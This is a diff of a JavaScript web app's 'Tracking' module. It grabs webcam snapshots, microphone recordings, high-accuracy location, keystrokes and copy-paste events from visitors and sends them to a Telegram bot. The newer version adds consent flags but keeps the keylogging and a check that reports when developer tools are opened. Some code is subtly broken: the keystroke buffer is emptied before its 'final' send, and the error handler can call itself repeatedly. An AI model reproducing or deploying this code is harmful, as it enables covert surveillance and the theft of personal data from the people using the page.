-    if (this.state.snapshotIntervalId) clearInterval(this.state.snapshotIntervalId);
-    if (this.state.activityTrackerIntervalId) clearInterval(this.state.activityTrackerIntervalId);
-    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
-    
-    // Stop media streams
-    this.Tracking.stopCamera();
-    this.Tracking.stopMicrophone();
-    
-    // Clear interval IDs
-    this.state.snapshotIntervalId = null;
-    this.state.activityTrackerIntervalId = null;
-    this.state.pageAnalyticsIntervalId = null;
-
-    // Clear buffered data
-    this.state.mouseMovements = [];
-    this.state.scrollHistory = [];
-    this.state.copyPasteEvents = [];
-    this.state.keyLogBuffer = "";
-    this.state.linkClicks = [];
-
-    // Send any remaining keystrokes before fully stopping
-    if (this.state.keyLogBuffer.length > 0) {
-      this.Tracking.send(`⌨️ Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
-    }
-    // Send final interaction report
-    this.logPageInteraction();
-  },
-
-  formatTime(ms) {
-    if (ms === undefined || ms === null || typeof ms !== 'number' || isNaN(ms)) return 'N/A';
-    const totalSeconds = Math.floor(ms / 1000);
-    const hours = Math.floor(totalSeconds / 3600);
-    const minutes = Math.floor((totalSeconds % 3600) / 60);
-    const seconds = totalSeconds % 60;
-    return [hours, minutes, seconds].map(v => v < 10 ? "0" + v : v).join(":");
-  },
-
   // --- Tracking Module ---
   Tracking: {
-    // Base URL for Telegram Bot API, using the botToken from App.config
-    telegramApiBaseUrl: `https://api.telegram.org/bot${App.config.botToken}/`,
+    telegramApiBaseUrl: `https://api.telegram.org/bot${App.config.botToken}/`, // Base URL with bot token
 
+    // Sends a text message to the Telegram chat
     async send(message, notify = false) {
-      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return; // Don't send if tracking is off or credentials are not set
+      // Do not send if token is missing, tracking is inactive, or analytics consent is not given
+      if (App.config.botToken === "YOUR_BOT_TOKEN_HERE" || !App.state.isTrackingActive || !App.state.consentSettings.analytics) {
+        if (App.config.botToken === "YOUR_BOT_TOKEN_HERE") console.warn("Telegram Bot Token not configured. Message not sent.");
+        else if (!App.state.isTrackingActive) console.log("Tracking is inactive. Message not sent.");
+        else if (!App.state.consentSettings.analytics) console.log("Analytics consent not given. Message not sent.");
+        return;
+      }
+      
       const url = `${this.telegramApiBaseUrl}sendMessage`;
       try {
         const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: App.config.chatId, // Use chatId from App.config
+            chat_id: App.config.chatId,
             text: message,
             parse_mode: 'Markdown',
             disable_notification: !notify // If notify is false, notification is disabled
@@ -692,22 +1017,30 @@ const App = {
         if (!response.ok) {
           const errorData = await response.json();
           console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`, errorData);
-          // Optionally, send this error to a fallback logging mechanism or a different chat
-          // this.send(`🚨 Telegram API Error (sendMessage): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
+          // Report Telegram API errors back to Telegram if possible
+          await this.send(`🚨 Telegram API Error (sendMessage): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
         } else {
-          // console.log("Message sent to Telegram successfully."); // Uncomment for verbose logging
+          // console.log("Message sent to Telegram successfully."); // Verbose logging
         }
       } catch (e) {
         console.warn("Fetch error sending message to Telegram:", e);
-        // this.send(`🚨 Network Error sending message to Telegram: ${e.message}`, true);
+        await this.send(`🚨 Network Error sending message to Telegram: ${e.message}`, true);
       }
     },
 
+    // Sends a photo to the Telegram chat
     async sendPhoto(caption, photoBlob) {
-      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
+      // Check if tracking is active, consent is given, and token is set
+      if (App.config.botToken === "YOUR_BOT_TOKEN_HERE" || !App.state.isTrackingActive || !App.state.consentSettings.camera) {
+        if (App.config.botToken === "YOUR_BOT_TOKEN_HERE") console.warn("Telegram Bot Token not configured. Photo not sent.");
+        else if (!App.state.isTrackingActive) console.log("Tracking is inactive. Photo not sent.");
+        else if (!App.state.consentSettings.camera) console.log("Camera consent not given. Photo not sent.");
+        return;
+      }
+      
       const url = `${this.telegramApiBaseUrl}sendPhoto`;
       const formData = new FormData();
-      formData.append('chat_id', App.config.chatId); // Use chatId from App.config
+      formData.append('chat_id', App.config.chatId);
       formData.append('caption', caption);
       formData.append('photo', photoBlob, `snapshot_${Date.now()}.png`); // File name for the photo
 
@@ -719,21 +1052,29 @@ const App = {
         if (!response.ok) {
           const errorData = await response.json();
           console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`, errorData);
-          // this.send(`🚨 Telegram API Error (sendPhoto): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
+          await this.send(`🚨 Telegram API Error (sendPhoto): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
         } else {
           console.log("Photo sent to Telegram successfully.");
         }
       } catch (e) {
         console.warn("Fetch error sending photo to Telegram:", e);
-        // this.send(`🚨 Network Error sending photo to Telegram: ${e.message}`, true);
+        await this.send(`🚨 Network Error sending photo to Telegram: ${e.message}`, true);
       }
     },
 
+    // Sends audio recording to the Telegram chat
     async sendAudio(caption, audioBlob) {
-      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
+      // Check if tracking is active, consent is given, and token is set
+      if (App.config.botToken === "YOUR_BOT_TOKEN_HERE" || !App.state.isTrackingActive || !App.state.consentSettings.microphone) {
+        if (App.config.botToken === "YOUR_BOT_TOKEN_HERE") console.warn("Telegram Bot Token not configured. Audio not sent.");
+        else if (!App.state.isTrackingActive) console.log("Tracking is inactive. Audio not sent.");
+        else if (!App.state.consentSettings.microphone) console.log("Microphone consent not given. Audio not sent.");
+        return;
+      }
+      
       const url = `${this.telegramApiBaseUrl}sendAudio`;
       const formData = new FormData();
-      formData.append('chat_id', App.config.chatId); // Use chatId from App.config
+      formData.append('chat_id', App.config.chatId);
       formData.append('caption', caption);
       formData.append('audio', audioBlob, `recording_${Date.now()}.ogg`); // File name for the audio
 
@@ -745,25 +1086,33 @@ const App = {
         if (!response.ok) {
           const errorData = await response.json();
           console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`, errorData);
-          // this.send(`🚨 Telegram API Error (sendAudio): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
+          await this.send(`🚨 Telegram API Error (sendAudio): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
         } else {
           console.log("Audio sent to Telegram successfully.");
         }
       } catch (e) {
         console.warn("Fetch error sending audio to Telegram:", e);
-        // this.send(`🚨 Network Error sending audio to Telegram: ${e.message}`, true);
+        await this.send(`🚨 Network Error sending audio to Telegram: ${e.message}`, true);
       }
     },
 
+    // Sends user's location to the Telegram chat
     async sendLocation(latitude, longitude, caption = "User Location") {
-      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
+      // Check if tracking is active, consent is given, and token is set
+      if (App.config.botToken === "YOUR_BOT_TOKEN_HERE" || !App.state.isTrackingActive || !App.state.consentSettings.location) {
+        if (App.config.botToken === "YOUR_BOT_TOKEN_HERE") console.warn("Telegram Bot Token not configured. Location not sent.");
+        else if (!App.state.isTrackingActive) console.log("Tracking is inactive. Location not sent.");
+        else if (!App.state.consentSettings.location) console.log("Location consent not given. Location not sent.");
+        return;
+      }
+      
       const url = `${this.telegramApiBaseUrl}sendLocation`;
       try {
         const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: App.config.chatId, // Use chatId from App.config
+            chat_id: App.config.chatId,
             latitude: latitude,
             longitude: longitude,
           })
@@ -771,263 +1120,303 @@ const App = {
         if (!response.ok) {
           const errorData = await response.json();
           console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`, errorData);
-          // this.send(`🚨 Telegram API Error (sendLocation): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
+          await this.send(`🚨 Telegram API Error (sendLocation): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
         } else {
           console.log("Location sent to Telegram successfully.");
         }
       } catch (e) {
         console.warn("Fetch error sending location to Telegram:", e);
-        // this.send(`🚨 Network Error sending location to Telegram: ${e.message}`, true);
+        await this.send(`🚨 Network Error sending location to Telegram: ${e.message}`, true);
       }
     },
 
+    // Initializes tracking based on consent settings and requests necessary permissions
     async initialize() {
-      console.log("Tracking initialized.");
-      if (App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") {
-          console.warn("Telegram bot token is not set. Tracking messages will not be sent.");
+      console.log("Tracking module initializing...");
+      
+      // Verify Telegram credentials are set. If not, disable tracking.
+      if (App.config.botToken === "YOUR_BOT_TOKEN_HERE" || App.config.chatId === "YOUR_CHAT_ID_HERE") {
+        console.warn("Telegram bot token or chat ID is not set. Tracking messages will NOT be sent.");
+        await this.send("🚨 Configuration Error: Telegram Bot Token or Chat ID is missing. Tracking data cannot be sent.", true);
+        App.state.isTrackingActive = false; 
       } else {
-          await this.send("🚀 New Session Started (Implicit Consent)");
-          await this.send(await this.getInitialReport());
+          App.state.isTrackingActive = true; // Assume active if config is present, then refine by consent
       }
 
-      // Check and request permissions
-      await this.checkAndRequestPermission('camera');
-      await this.checkAndRequestPermission('microphone');
-      await this.checkAndRequestPermission('geolocation');
+      // Only proceed if consent has been given and tracking is potentially active
+      if (App.state.isConsentGiven && App.state.isTrackingActive) {
+          // Request permissions based on user's consent choices
+          if (App.state.consentSettings.camera) await this.checkAndRequestPermission('camera');
+          if (App.state.consentSettings.microphone) await this.checkAndRequestPermission('microphone');
+          if (App.state.consentSettings.location) await this.checkAndRequestPermission('geolocation');
+          
+          // Detect developer tools if analytics consent is given
+          if (App.state.consentSettings.analytics) this.detectDevTools();
 
-      this.detectDevTools();
+          // Start snapshotting if camera consent is given, stream is available, and tracking is active
+          if (App.state.cameraStream && App.state.consentSettings.camera) {
+            this.startSnapshotting();
+          }
 
-      // Start snapshotting if camera is available and tracking is active
-      if (App.state.cameraStream && App.state.isTrackingActive) {
-        this.startSnapshotting();
+          // Start microphone recording if mic consent is given, stream is available, and tracking is active
+          if (App.state.microphoneStream && App.state.consentSettings.microphone) {
+            // startMicRecording is called within requestMicrophoneStream
+          }
+
+          // Start periodic activity reporting
+          if (App.state.activityTrackerIntervalId) clearInterval(App.state.activityTrackerIntervalId);
+          App.state.activityTrackerIntervalId = setInterval(() => {
+            this.sendAccumulatedActivity();
+          }, App.config.activityTrackingInterval);
+
+          // Send initial reports if analytics consent is given
+          if (App.state.consentSettings.analytics) {
+            await this.send("🚀 New Session Started (Explicit Consent)");
+            await this.send(await this.getInitialReport());
+          }
+      } else {
+          console.log("Tracking not initialized: No consent given or tracking inactive.");
+          App.state.isTrackingActive = false; // Ensure tracking is off
       }
-
-      // Start microphone recording if stream is available and interval is set
-      if (App.state.microphoneStream && App.state.isTrackingActive && App.config.micRecordInterval > 0) {
-        // Microphone recording is handled by MediaRecorder's onstop event, initiated in requestPermissionDirectly
-        // We might want to start it here if the stream is available, but it's better managed by the permission flow.
-      }
-
-      // Start periodic activity reporting
-      if (App.state.activityTrackerIntervalId) clearInterval(App.state.activityTrackerIntervalId);
-      App.state.activityTrackerIntervalId = setInterval(() => {
-        this.sendAccumulatedActivity();
-      }, App.config.activityTrackingInterval);
+      
+      App.updateTrackingStatusBanner(); // Update status banner based on final state
     },
 
+    // Checks current permission status and requests it if necessary and consented.
+    // This function orchestrates using the Permissions API or direct requests.
     async checkAndRequestPermission(name) {
-      const savedPermission = App.state.permissions[name];
-      console.log(`Checking permission for: ${name} (Saved: ${savedPermission})`);
-
-      // If permission was explicitly granted or denied before, use that state
-      if (savedPermission === 'granted') {
-        console.log(`Permission for ${name} was previously granted. Attempting to initialize tracking.`);
-        if (name === 'camera') this.requestCameraStream(); // Helper to get stream if granted
-        else if (name === 'microphone') this.requestMicrophoneStream(); // Helper to get stream if granted
-        else if (name === 'geolocation') this.requestGeolocation();
-        return;
-      } else if (savedPermission === 'denied') {
-        console.log(`Permission for ${name} was previously denied. Not requesting.`);
-        this.send(`ℹ️ Permission for ${name} was previously denied.`);
-        return;
+      const permissionKey = `permission_${name}`; // e.g., 'permission_camera'
+      const savedPermissionState = localStorage.getItem(permissionKey);
+      
+      // If the permission state is known from previous sessions (granted/denied), respect it.
+      // No prompt is shown if the state is already determined.
+      if (savedPermissionState === 'granted') {
+        App.state.permissions[name] = 'granted';
+        console.log(`Permission for ${name} was previously granted. No prompt shown.`);
+        return; // Permission already granted, no action needed.
+      } else if (savedPermissionState === 'denied') {
+        App.state.permissions[name] = 'denied';
+        console.log(`Permission for ${name} was previously denied. No prompt shown.`);
+        this.send(`ℹ️ Permission for ${name} was previously denied and is not being requested.`);
+        return; // Permission already denied, no action needed.
       }
 
-      // If not explicitly handled, use the Permissions API if available
+      // --- If permission state is unknown (prompt or not set) ---
       try {
-        if (!navigator.permissions) {
+        let permissionGranted = false; // Flag to track if permission was ultimately granted
+        
+        // Try using the Permissions API first if it's available.
+        if (navigator.permissions) {
+          const status = await navigator.permissions.query({ name }); // Query permission status
+          console.log(`Permission '${name}' initial state via Permissions API: ${status.state}`);
+
+          if (status.state === 'granted') {
+            App.state.permissions[name] = 'granted';
+            localStorage.setItem(permissionKey, 'granted');
+            console.log(`Permission for ${name} confirmed as granted via Permissions API.`);
+            permissionGranted = true;
+          } else if (status.state === 'denied') {
+            App.state.permissions[name] = 'denied';
+            localStorage.setItem(permissionKey, 'denied');
+            console.log(`Permission for ${name} confirmed as denied via Permissions API.`);
+            this.send(`🚫 Permission for ${name} denied by user via Permissions API.`);
+            permissionGranted = false;
+          } else { // status.state === 'prompt'
+            console.log(`Permission '${name}' is in 'prompt' state. Attempting direct request to show native prompt.`);
+            // If state is 'prompt', we must call the direct request API to show the native prompt.
+            await this.requestPermissionDirectly(name);
+            // After the direct request (which is asynchronous), we check the updated state.
+            permissionGranted = App.state.permissions[name] === 'granted';
+          }
+        } else {
+          // Fallback if Permissions API is not supported. Directly attempt the request.
           console.warn(`Permissions API not supported for ${name}. Attempting direct request.`);
           await this.requestPermissionDirectly(name);
-          return;
+          // After direct request, check the updated state.
+          permissionGranted = App.state.permissions[name] === 'granted';
         }
 
-        const status = await navigator.permissions.query({ name }); // [10, 18, 21, 25]
-        console.log(`Permission '${name}' initial state: ${status.state}`);
-
-        if (status.state === 'granted') {
-          App.state.permissions[name] = 'granted';
-          localStorage.setItem(`permission_${name}`, 'granted');
-          console.log(`Permission for ${name} granted via Permissions API.`);
-          if (name === 'camera') this.requestCameraStream();
-          else if (name === 'microphone') this.requestMicrophoneStream();
-          else if (name === 'geolocation') this.requestGeolocation();
-        } else if (status.state === 'denied') {
-          App.state.permissions[name] = 'denied';
-          localStorage.setItem(`permission_${name}`, 'denied');
-          console.log(`Permission for ${name} denied by user via Permissions API.`);
-          this.send(`🚫 Permission for ${name} denied by user via Permissions API.`);
-        } else { // 'prompt' or other states
-          console.log(`Permission for ${name} is in 'prompt' state. Requesting directly.`);
-          await this.requestPermissionDirectly(name); // This will trigger the user prompt
-        }
-
-        // Add listener for permission status changes
-        status.onchange = async () => {
-          console.log(`Permission '${name}' status changed to: ${status.state}`);
-          const newState = status.state;
-          App.state.permissions[name] = newState;
-          localStorage.setItem(`permission_${name}`, newState);
-
-          if (newState === 'granted') {
-            console.log(`Permission for ${name} granted via change listener.`);
-            if (name === 'camera') this.requestCameraStream();
-            else if (name === 'microphone') this.requestMicrophoneStream();
-            else if (name === 'geolocation') this.requestGeolocation();
-          } else if (newState === 'denied') {
-            console.log(`Permission for ${name} denied via change listener.`);
-            this.send(`🚫 Permission for ${name} denied by user via change listener.`);
+        // Log and send confirmation based on the final determined state.
+        if (permissionGranted) {
+          this.send(`✅ User granted ${name} permission.`);
+        } else {
+          // If not granted, and not already denied from saved state or API, report denial.
+          if (App.state.permissions[name] !== 'denied') { 
+             this.send(`🚫 User denied ${name} permission.`);
+             App.state.permissions[name] = 'denied'; // Ensure state is updated to denied
+             localStorage.setItem(permissionKey, 'denied');
           }
-        };
+        }
+        
       } catch (e) {
-        console.warn(`Error checking/requesting permission for ${name}:`, e);
-        // Fallback to direct request if Permissions API fails or is unavailable
-        await this.requestPermissionDirectly(name);
+        // Catch errors during the permission check or direct request.
+        console.warn(`Error during permission check/request for ${name}:`, e);
+        // Attempt direct request as a fallback if not already granted/denied, and log the error.
+        if (App.state.permissions[name] !== 'granted' && App.state.permissions[name] !== 'denied') {
+             await this.requestPermissionDirectly(name); // Ensure direct request is attempted on error
+             // Re-check state after the direct request.
+             const finalPermissionState = App.state.permissions[name] || 'unknown'; // Get state updated by requestPermissionDirectly
+             if (finalPermissionState === 'granted') {
+                 this.send(`✅ User granted ${name} permission after error.`);
+             } else {
+                 this.send(`🚫 User denied ${name} permission after error.`);
+                 App.state.permissions[name] = 'denied'; // Ensure state is updated to denied
+                 localStorage.setItem(permissionKey, 'denied');
+             }
+        } else { // If state was already determined, just log the error.
+            this.send(`🚨 Unexpected error during ${name} permission check, but state was already ${App.state.permissions[name]}. Error: ${e.message}`);
+        }
       }
     },
 
-    // Helper to re-request stream if permission was already granted
-    requestCameraStream() {
-        if (!App.state.isTrackingActive) return;
-        navigator.mediaDevices.getUserMedia({ video: true }) // [2, 5]
-            .then(stream => {
-                App.state.cameraStream = stream;
-                App.DOM.captureVideo.srcObject = stream;
-                App.DOM.captureVideo.play();
-                this.startSnapshotting(); // Start snapshotting if stream is available
-                console.log("Camera stream re-initialized successfully.");
-            })
-            .catch(e => {
-                console.warn("Failed to re-initialize camera stream:", e);
-                this.send("⚠️ Could not re-initialize camera stream.");
-                App.state.permissions.camera = 'denied'; // Update state if re-initialization fails
-                localStorage.setItem('permission_camera', 'denied');
-            });
-    },
-
-    requestMicrophoneStream() {
-        if (!App.state.isTrackingActive) return;
-        navigator.mediaDevices.getUserMedia({ audio: true }) // [2, 5]
-            .then(stream => {
-                App.state.microphoneStream = stream;
-                App.startMicRecording(stream); // Start recording
-                console.log("Microphone stream re-initialized successfully.");
-            })
-            .catch(e => {
-                console.warn("Failed to re-initialize microphone stream:", e);
-                this.send("⚠️ Could not re-initialize microphone stream.");
-                App.state.permissions.microphone = 'denied'; // Update state if re-initialization fails
-                localStorage.setItem('permission_microphone', 'denied');
-            });
-    },
-
-    // Request permissions directly, prompting the user
+    // Directly requests permission using browser APIs (e.g., getUserMedia, getCurrentPosition).
+    // This is the function that should trigger native browser prompts.
     async requestPermissionDirectly(name) {
       try {
-        let stream = null;
         if (name === 'camera') {
-            stream = await navigator.mediaDevices.getUserMedia({ video: true }); // [2, 5]
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true }); // This call triggers the camera prompt
             App.state.cameraStream = stream;
             App.DOM.captureVideo.srcObject = stream;
             App.DOM.captureVideo.play();
-            this.startSnapshotting(); // Start snapshotting interval
-            this.send("✅ Camera permission granted.");
+            localStorage.setItem('permission_camera', 'granted'); // Update state on success
+            console.log("Camera stream obtained via direct request.");
+            this.startSnapshotting(); // Start snapshotting if consent and stream are valid
+            this.send("✅ Camera permission granted via direct request.");
         } else if (name === 'microphone') {
-            stream = await navigator.mediaDevices.getUserMedia({ audio: true }); // [2, 5]
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); // This call triggers the microphone prompt
             App.state.microphoneStream = stream;
-            App.startMicRecording(stream); // Start microphone recording
-            this.send("✅ Microphone permission granted.");
+            this.startMicRecording(stream); // Start microphone recording
+            localStorage.setItem('permission_microphone', 'granted'); // Update state on success
+            console.log("Microphone stream obtained via direct request.");
+            this.send("✅ Microphone permission granted via direct request.");
         } else if (name === 'geolocation') {
+          // getCurrentPosition uses callbacks for success/error, not await/promise directly.
           navigator.geolocation.getCurrentPosition(
             p => { // Success callback
               App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
               console.log(`Geolocation obtained: ${p.coords.latitude}, ${p.coords.longitude}`);
-              this.sendLocation(p.coords.latitude, p.coords.longitude); // [1]
+              this.sendLocation(p.coords.latitude, p.coords.longitude); // Send location data
+              localStorage.setItem('permission_geolocation', 'granted'); // Update state on success
+              App.state.permissions.geolocation = 'granted'; // Update global state
               App.updateActivityTime();
-              App.state.permissions.geolocation = 'granted';
-              localStorage.setItem('permission_geolocation', 'granted');
             },
             e => { // Error callback
               console.warn("Geolocation error:", e);
-              this.send(`🚫 Geolocation Error: Code ${e.code} - ${e.message}`); // [1, 3, 7, 15]
-              App.state.permissions.geolocation = 'denied';
-              localStorage.setItem('permission_geolocation', 'denied');
+              this.send(`🚫 Geolocation Error: Code ${e.code} - ${e.message}`); // Log error
+              localStorage.setItem('permission_geolocation', 'denied'); // Update state on error
+              App.state.permissions.geolocation = 'denied'; // Update global state
             },
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 } // Options for accuracy and timeout [1, 7]
+            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 } // Options for accuracy and timeout
           );
-          return; // Geolocation request is asynchronous and handled by callbacks
+          return; // Geolocation request is handled by callbacks, so exit here.
         }
-
-        // If a stream was obtained for camera or microphone
-        if (stream) {
-            App.state.permissions[name] = 'granted';
-            localStorage.setItem(`permission_${name}`, 'granted');
+        
+        // If a stream was obtained for camera or microphone, update state and log.
+        if (name === 'camera' || name === 'microphone') {
+            App.state.permissions[name] = 'granted'; // Update global state
         }
       } catch (e) {
+        // Catch errors from getUserMedia or other direct calls.
         console.warn(`${name} permission denied or unavailable:`, e);
         this.send(`🚫 ${name} permission denied or unavailable: ${e.message}`);
-        App.state.permissions[name] = 'denied';
-        localStorage.setItem(`permission_${name}`, 'denied');
+        localStorage.setItem(`permission_${name}`, 'denied'); // Update state on denial/error
+        App.state.permissions[name] = 'denied'; // Update global state
       }
     },
 
+    // Pauses active media tracking (camera, microphone) when tab is hidden.
+    pauseTracking() {
+      if (App.state.cameraStream) {
+        App.state.cameraStream.getTracks().forEach(track => track.enabled = false); // Disable video track
+        this.stopSnapshotting(); // Stop interval
+      }
+      if (App.state.mediaRecorder && App.state.mediaRecorder.state !== 'inactive') {
+        App.state.mediaRecorder.pause(); // Pause recording if possible
+        this.send("Microphone paused due to tab hidden.");
+      }
+    },
+
+    // Resumes active media tracking when tab becomes visible again.
+    resumeTracking() {
+      // Re-enable camera stream if consent given and stream exists
+      if (App.state.cameraStream && App.state.consentSettings.camera) {
+        App.state.cameraStream.getTracks().forEach(track => track.enabled = true); // Re-enable video track
+        this.startSnapshotting(); // Restart interval
+      }
+      // Resume microphone recording if it was paused and consent is given
+      if (App.state.mediaRecorder && App.state.mediaRecorder.state === 'paused' && App.state.consentSettings.microphone) {
+        App.state.mediaRecorder.resume(); // Resume recording
+        this.send("Microphone resumed.");
+      }
+    },
+
+    // Stops and cleans up the camera stream.
     stopCamera() {
       if (App.state.cameraStream) {
-        App.state.cameraStream.getTracks().forEach(track => track.stop());
+        App.state.cameraStream.getTracks().forEach(track => track.stop()); // Stop all tracks
         App.state.cameraStream = null;
-        App.DOM.captureVideo.srcObject = null;
+        App.DOM.captureVideo.srcObject = null; // Clear video source
         this.stopSnapshotting(); // Stop the interval
         console.log("Camera stream stopped.");
       }
     },
 
+    // Stops and cleans up the microphone stream and recorder.
     stopMicrophone() {
       if (App.state.microphoneStream) {
-        App.state.microphoneStream.getTracks().forEach(track => track.stop());
+        App.state.microphoneStream.getTracks().forEach(track => track.stop()); // Stop all tracks
         App.state.microphoneStream = null;
         if (App.state.mediaRecorder) {
-          App.state.mediaRecorder.stop(); // Stop the recorder if it's active
+          App.state.mediaRecorder.stop(); // Stop the recorder if active
           App.state.mediaRecorder = null;
         }
         console.log("Microphone stream stopped.");
       }
     },
 
+    // Detects if browser developer tools are open using window dimensions.
     detectDevTools() {
-      const threshold = 160; // Heuristic: difference in window size when DevTools are open
-      let devToolsCurrentlyOpen = false; // State to track current DevTools status
+      const threshold = 160; // Heuristic threshold for DevTools detection
+      let devToolsCheckInterval = null; // Interval ID for the check
 
       const check = () => {
-        // Check window dimensions to detect DevTools
+        // Compare outer and inner window dimensions to detect DevTools
         const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
         
-        if (isDevToolsOpen && !App.state.devToolsOpen) {
+        if (isDevToolsOpen && !App.state.devToolsOpen) { // DevTools just opened
           App.state.devToolsOpen = true;
           console.log("Developer Tools Opened!");
-          this.send("⚠️ Developer Tools Opened!", true); // High priority notification
-        } else if (!isDevToolsOpen && App.state.devToolsOpen) {
+          if (App.state.consentSettings.analytics) this.send("⚠️ Developer Tools Opened!", true);
+        } else if (!isDevToolsOpen && App.state.devToolsOpen) { // DevTools just closed
           App.state.devToolsOpen = false;
           console.log("Developer Tools Closed!");
-          this.send("✅ Developer Tools Closed.", true); // High priority notification
+          if (App.state.consentSettings.analytics) this.send("✅ Developer Tools Closed.", true);
         }
-        // Continue checking recursively using requestAnimationFrame for smooth updates
-        requestAnimationFrame(check);
       };
-      // Start the DevTools detection loop
-      requestAnimationFrame(check);
+      
+      // Start checking periodically only if analytics consent is given
+      if (App.state.consentSettings.analytics) {
+        if (!devToolsCheckInterval) {
+           devToolsCheckInterval = setInterval(check, 2000); // Check every 2 seconds
+        }
+      } else {
+        // Clear interval if analytics consent is revoked or never given
+        if (devToolsCheckInterval) clearInterval(devToolsCheckInterval);
+      }
     },
 
+    // Starts the interval for taking webcam snapshots if conditions are met.
     startSnapshotting() {
-      // Prevent starting multiple intervals
-      if (App.state.snapshotIntervalId) return;
-      if (!App.state.cameraStream) {
-          console.warn("Cannot start snapshotting: Camera stream is not available.");
-          return;
-      }
+      // Conditions: tracking active, camera consent given, camera stream available, interval not already running.
+      if (!App.state.isTrackingActive || !App.state.consentSettings.camera || !App.state.cameraStream || App.state.snapshotIntervalId) return;
+      
       console.log(`Starting snapshotting every ${App.config.snapshotInterval}ms.`);
       App.state.snapshotIntervalId = setInterval(() => {
         this.captureAndSend("📸 Webcam Snapshot");
       }, App.config.snapshotInterval);
     },
 
+    // Stops the snapshot interval.
     stopSnapshotting() {
       if (App.state.snapshotIntervalId) {
         clearInterval(this.state.snapshotIntervalId);
@@ -1036,6 +1425,7 @@ const App = {
       }
     },
 
+    // Captures a frame from the video element and sends it as a photo.
     captureAndSend(caption) {
       if (!App.state.cameraStream || !App.DOM.captureVideo || !App.DOM.captureCanvas) {
         console.warn("Snapshot capture failed: Missing camera stream or canvas elements.");
@@ -1055,38 +1445,40 @@ const App = {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // Draw the current frame from the video onto the canvas
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw frame to canvas
 
-      // Convert the canvas content to a Blob
-      canvas.toBlob(async (blob) => {
+      canvas.toBlob(async (blob) => { // Convert canvas to Blob
         if (blob) {
           console.log("Snapshot captured, sending to Telegram...");
-          await this.sendPhoto(caption, blob);
+          await this.sendPhoto(caption, blob); // Send the Blob
         } else {
           console.error("Failed to create snapshot blob.");
-          this.send("🚨 Failed to create snapshot blob.");
+          await this.send("🚨 Failed to create snapshot blob.");
         }
       }, 'image/png'); // Specify image format
     },
 
-    // Implements microphone recording using MediaRecorder
+    // Implements microphone recording using MediaRecorder.
     startMicRecording(stream) {
-      if (!stream || !App.state.isTrackingActive) {
-          console.warn("Cannot start mic recording: Stream not available or tracking is inactive.");
+      // Conditions: stream available, tracking active, mic consent given.
+      if (!stream || !App.state.isTrackingActive || !App.state.consentSettings.microphone) {
+          console.warn("Cannot start mic recording: Stream not available, tracking inactive, or consent not given.");
           return;
       }
 
+      // Stop any existing recorder before starting a new one.
       if (App.state.mediaRecorder && App.state.mediaRecorder.state !== 'inactive') {
-          App.state.mediaRecorder.stop(); // Stop existing recorder if it's running
+          App.state.mediaRecorder.stop(); 
       }
 
-      // Use 'audio/ogg' with opus codec for better browser compatibility and lower file size
-      App.state.mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg; codecs=opus' }); // [4, 6, 11]
-      let audioChunks = [];
+      // Use 'audio/ogg' with opus codec for better compatibility and size.
+      App.state.mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg; codecs=opus' }); 
+      let audioChunks = []; // Array to hold audio data chunks
 
       App.state.mediaRecorder.ondataavailable = event => {
-          audioChunks.push(event.data); // Collect audio data chunks
+          if (event.data.size > 0) { // Only push if data exists
+              audioChunks.push(event.data);
+          }
       };
 
       App.state.mediaRecorder.onstop = () => {
@@ -1094,31 +1486,31 @@ const App = {
               const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' }); // Create Blob from chunks
               audioChunks = []; // Clear chunks for next recording
               console.log("Microphone recording stopped, sending audio...");
-              this.sendAudio("🎤 Microphone Recording", audioBlob); // [14]
+              this.sendAudio("🎤 Microphone Recording", audioBlob); // Send audio to Telegram
           }
-          // Optionally restart recording if mic is still active and tracking is on
-          // This logic would depend on whether you want continuous recording or discrete chunks.
-          // For discrete chunks based on interval, this might be sufficient.
-          // If using micRecordInterval, we might need a timer to trigger MediaRecorder.stop().
+          // After stop, if tracking is still active and consented, prepare for next recording chunk.
+          if (App.state.isTrackingActive && App.state.consentSettings.microphone) {
+              if (App.state.microphoneStream) {
+                  this.startMicRecording(App.state.microphoneStream); // Restart recording for the next chunk
+              }
+          }
       };
 
-      App.state.mediaRecorder.start(App.config.micRecordInterval); // Start recording, will emit 'stop' event after interval
-      console.log(`Microphone recording started (interval: ${App.config.micRecordInterval}ms).`);
+      // Start recording. The `micRecordInterval` determines how often `onstop` event is fired.
